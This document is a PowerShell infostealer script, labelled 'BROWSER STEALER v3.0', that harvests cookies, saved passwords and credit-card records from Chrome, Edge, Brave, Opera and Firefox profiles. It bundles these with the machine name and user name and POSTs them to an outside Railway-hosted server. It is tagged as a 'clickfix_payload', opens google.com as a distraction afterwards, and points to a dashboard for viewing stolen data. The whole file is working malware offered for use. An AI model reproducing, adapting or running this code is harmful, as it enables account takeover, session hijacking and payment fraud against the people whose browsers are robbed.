# ============================================================
# BROWSER STEALER — FINAL WORKING VERSION
# Uses .NET SQLite — No downloads, works on Windows 10/11
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

function Write-Color {
    param($Message, $Color)
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# LOAD SQLITE (Built into Windows 10/11 .NET)
# ============================================================

Write-Color "[+] Loading SQLite..." "Cyan"

$sqliteLoaded = $false

# Try Microsoft.Data.Sqlite (Windows 10/11 with .NET)
try {
    Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
    $sqliteLoaded = $true
    $sqliteType = "Microsoft.Data.Sqlite"
    Write-Color "[+] Microsoft.Data.Sqlite loaded" "Green"
} catch {
    Write-Color "[!] Microsoft.Data.Sqlite not available" "Yellow"
}

# Try System.Data.SQLite (fallback)
if (-not $sqliteLoaded) {
    try {
        [System.Data.SQLite.SQLiteConnection]::new() | Out-Null
        $sqliteLoaded = $true
        $sqliteType = "System.Data.SQLite"
        Write-Color "[+] System.Data.SQLite loaded" "Green"
    } catch {
        Write-Color "[!] System.Data.SQLite not available" "Yellow"
    }
}

# Try to download SQLite DLL
if (-not $sqliteLoaded) {
    Write-Color "[+] Attempting to download SQLite DLL..." "Cyan"
    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
    $url = "https://raw.githubusercontent.com/ackara/System.Data.SQLite/master/System.Data.SQLite.dll"
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $dllPath)
        if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            $sqliteLoaded = $true
            $sqliteType = "System.Data.SQLite"
            Write-Color "[+] SQLite downloaded and loaded" "Green"
        }
    } catch {
        Write-Color "[!] Failed to download SQLite" "Red"
    }
}

if (-not $sqliteLoaded) {
    Write-Color "[!] No SQLite available — cannot extract data" "Red"
    Write-Color "[*] Make sure this PC has .NET installed" "Yellow"
}

# ============================================================
# SQLITE READER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $results = @()
    
    if (-not (Test-Path $DbPath)) { return $results }
    if (-not $sqliteLoaded) { return $results }
    
    try {
        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $tempDb -Force
        
        if ($sqliteType -eq "Microsoft.Data.Sqlite") {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $name = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    if ($value -ne $null) {
                        $row[$name] = $value
                    }
                }
                $results += $row
            }
            $reader.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $row = @{}
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $name = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    if ($value -ne $null) {
                        $row[$name] = $value
                    }
                }
                $results += $row
            }
            $reader.Close()
            $conn.Close()
        }
        
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        
    } catch {
        # Silently fail
    }
    return $results
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($DbPath, $BrowserName)
    $cookies = @()
    if (-not (Test-Path $DbPath)) { return $cookies }
    if (-not $sqliteLoaded) { return $cookies }
    
    try {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value, path FROM cookies"
        foreach ($row in $rows) {
            if ($row['name'] -and $row['value']) {
                $domain = $row['host_key']
                if ($domain) { $domain = $domain -replace '^\.', '' } else { $domain = "unknown" }
                $cookies += @{
                    domain = $domain
                    name = $row['name']
                    value = $row['value']
                    path = "/"
                    browser = $BrowserName
                }
            }
        }
    } catch {}
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    if (-not $sqliteLoaded) { return $cookies }
    
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                try {
                    $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value, path FROM moz_cookies"
                    foreach ($row in $rows) {
                        if ($row['name'] -and $row['value']) {
                            $domain = $row['host']
                            if ($domain) { $domain = $domain -replace '^\.', '' } else { $domain = "unknown" }
                            $cookies += @{
                                domain = $domain
                                name = $row['name']
                                value = $row['value']
                                path = "/"
                                browser = "Firefox"
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-ChromePasswords {
    param($DbPath, $BrowserName)
    $passwords = @()
    if (-not (Test-Path $DbPath)) { return $passwords }
    if (-not $sqliteLoaded) { return $passwords }
    
    try {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($row in $rows) {
            if ($row['username_value'] -and $row['password_value']) {
                $url = $row['origin_url']
                if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
                $passwords += @{
                    url = $url
                    username = $row['username_value']
                    password = $row['password_value']
                    browser = $BrowserName
                }
            }
        }
    } catch {}
    return $passwords
}

function Get-OperaPasswords {
    $passwords = @()
    if (-not $sqliteLoaded) { return $passwords }
    
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $path) {
        try {
            $rows = Read-SQLite -DbPath $path -Query "SELECT origin_url, username_value, password_value FROM logins"
            foreach ($row in $rows) {
                if ($row['username_value'] -and $row['password_value']) {
                    $url = $row['origin_url']
                    if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
                    $passwords += @{
                        url = $url
                        username = $row['username_value']
                        password = $row['password_value']
                        browser = "Opera"
                    }
                }
            }
        } catch {}
    }
    return $passwords
}

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                    if ($content.logins) {
                        foreach ($login in $content.logins) {
                            $url = $login.hostname
                            if ($url) { $url = $url -replace 'https?://', '' } else { $url = "unknown" }
                            $passwords += @{
                                url = $url
                                username = $login.username
                                password = $login.password
                                browser = "Firefox"
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    param($DbPath, $BrowserName)
    $cards = @()
    if (-not (Test-Path $DbPath)) { return $cards }
    if (-not $sqliteLoaded) { return $cards }
    
    try {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($row in $rows) {
            if ($row['name_on_card'] -and $row['card_number_encrypted']) {
                $cards += @{
                    name = $row['name_on_card']
                    number = $row['card_number_encrypted']
                    month = $row['expiration_month']
                    year = $row['expiration_year']
                    browser = $BrowserName
                }
            }
        }
    } catch {}
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

Write-Color "" "White"
Write-Color "============================================" "Cyan"
Write-Color "  BROWSER STEALER v3.0" "Green"
Write-Color "  Target: $pcName" "Yellow"
Write-Color "  User: $userName" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color "" "White"

if (-not $sqliteLoaded) {
    Write-Color "[!] SQLite not available — cannot extract data" "Red"
    Write-Color "[*] Make sure you have .NET installed" "Yellow"
    Write-Color "[*] Windows 10/11 should have it by default" "Yellow"
}

# ---- ALL COOKIES ----
$allCookies = @()

Write-Color "[+] Chrome cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Chrome"

Write-Color "[+] Edge cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Edge"

Write-Color "[+] Brave cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Brave"

Write-Color "[+] Opera cookies..." "Cyan"
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $path -BrowserName "Opera"

Write-Color "[+] Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# ---- ALL PASSWORDS ----
$allPasswords = @()

Write-Color "[+] Chrome passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Chrome"

Write-Color "[+] Edge passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Edge"

Write-Color "[+] Brave passwords..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $path -BrowserName "Brave"

Write-Color "[+] Opera passwords..." "Cyan"
$allPasswords += Get-OperaPasswords

Write-Color "[+] Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- ALL CARDS ----
$allCards = @()

Write-Color "[+] Chrome cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $path -BrowserName "Chrome"

Write-Color "[+] Edge cards..." "Cyan"
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $path -BrowserName "Edge"

Write-Color "[+] Brave cards..." "Cyan"
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $path -BrowserName "Brave"

# ---- SUMMARY ----
Write-Color "" "White"
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color "" "White"

# ---- BUILD PAYLOAD ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
        os = (Get-WmiObject Win32_OperatingSystem).Caption
    }
    fingerprint = @{
        userAgent = "PowerShell Payload"
        hostname = $pcName
        browser = "PowerShell"
        screen = "N/A"
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- SEND TO SERVER ----
Write-Color "[+] Sending data to server..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- CLEANUP ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- DISTRACTION ----
Write-Color "[+] Opening distraction..." "Cyan"
Start-Process "https://www.google.com"

Write-Color "" "White"
Write-Color "[+] Done!" "Green"
Write-Color "" "White"

# ---- SHOW SAMPLE DATA ----
if ($allPasswords.Count -gt 0) {
    Write-Color "=== SAMPLE PASSWORDS (First 3) ===" "Green"
    $allPasswords | Select-Object -First 3 | ForEach-Object {
        Write-Color "  $($_.url) - $($_.username) / $($_.password)" "Yellow"
    }
    Write-Color "" "White"
}

if ($allCookies.Count -gt 0) {
    Write-Color "=== SAMPLE COOKIES (First 3) ===" "Green"
    $allCookies | Select-Object -First 3 | ForEach-Object {
        $short = $_.value
        if ($short.Length -gt 20) { $short = $short.Substring(0, 20) + "..." }
        Write-Color "  $($_.domain) - $($_.name) = $short" "Yellow"
    }
    Write-Color "" "White"
}

if ($allCards.Count -gt 0) {
    Write-Color "=== SAMPLE CARDS (First 3) ===" "Green"
    $allCards | Select-Object -First 3 | ForEach-Object {
        Write-Color "  $($_.name) - $($_.number) ($($_.month)/$($_.year))" "Yellow"
    }
    Write-Color "" "White"
}

Write-Color "[*] Check dashboard: https://cipheranon-production.up.railway.app/dashboard" "Cyan"
Write-Color "" "White"
